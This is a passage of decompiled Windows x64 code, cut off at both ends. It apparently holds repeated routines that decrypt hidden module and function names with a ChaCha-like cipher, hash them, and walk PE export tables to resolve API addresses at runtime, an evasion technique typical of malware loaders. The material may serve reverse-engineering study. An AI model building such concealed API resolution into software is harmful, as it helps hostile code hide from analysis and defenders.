          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140009f56;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140009f56:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140009fc0 @ 140009fc0 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140009fc0(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0xc);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xb);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_14000a316;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_14000a316:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_14000a380 @ 14000a380 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_14000a380(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x1c);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x19);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_14000a6d6;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_14000a6d6:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_14000a740 @ 14000a740 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_14000a740(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
